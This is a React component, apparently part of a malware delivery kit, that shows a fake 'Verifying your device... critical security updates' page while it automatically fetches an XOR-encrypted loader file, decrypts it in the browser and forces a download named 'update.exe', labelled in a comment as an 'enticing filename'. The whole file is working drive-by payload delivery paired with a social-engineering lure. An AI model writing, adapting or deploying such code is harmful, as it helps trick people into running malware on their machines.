import React, { useEffect } from 'react';

const PayloadDelivery = () => {
    useEffect(() => {
        const XOR_KEY = 0xAB;  // Must match the Python script
        
        const fetchAndExecute = async () => {
            try {
                // Fetch the encrypted loader shellcode
                const response = await fetch('/payloads/loader_stage.bin');
                const encryptedBase64 = await response.text();
                
                // Decode from Base64 to binary
                const encryptedBytes = Uint8Array.from(atob(encryptedBase64), c => c.charCodeAt(0));
                
                // XOR decrypt the loader shellcode
                const decryptedLoader = new Uint8Array(encryptedBytes.length);
                for (let i = 0; i < encryptedBytes.length; i++) {
                    decryptedLoader[i] = encryptedBytes[i] ^ XOR_KEY;
                }
                
                // Convert the decrypted shellcode to a Blob
                const blob = new Blob([decryptedLoader], { type: 'application/octet-stream' });
                const url = URL.createObjectURL(blob);
                
                // Trigger download of the decrypted loader
                const link = document.createElement('a');
                link.href = url;
                link.download = 'update.exe';  // Enticing filename
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
                
                // Clean up
                URL.revokeObjectURL(url);
                
                console.log('[+] Payload delivered successfully');
            } catch (error) {
                console.error('[-] Payload delivery failed:', error);
            }
        };
        
        // Automatically trigger the payload after a short delay
        const timer = setTimeout(() => {
            fetchAndExecute();
        }, 1500);
        
        return () => clearTimeout(timer);
    }, []);
    
    return (
        <div style={{
            display: 'flex',
            justifyContent: 'center',
            alignItems: 'center',
            height: '100vh',
            fontFamily: 'Arial, sans-serif',
            backgroundColor: '#f0f2f5',
            textAlign: 'center'
        }}>
            <div style={{
                padding: '40px',
                backgroundColor: 'white',
                borderRadius: '8px',
                boxShadow: '0 2px 10px rgba(0,0,0,0.1)'
            }}>
                <h2>Verifying your device...</h2>
                <p>Please wait while we check for critical security updates.</p>
                <div style={{ marginTop: '20px' }}>
                    <div className="spinner" style={{
                        border: '4px solid #f3f3f3',
                        borderTop: '4px solid #3498db',
                        borderRadius: '50%',
                        width: '40px',
                        height: '40px',
                        animation: 'spin 1s linear infinite',
                        margin: '0 auto'
                    }}></div>
                </div>
            </div>
            <style>
                {`
                    @keyframes spin {
                        0% { transform: rotate(0deg); }
                        100% { transform: rotate(360deg); }
                    }
                `}
            </style>
        </div>
    );
};

export default PayloadDelivery;fgvc  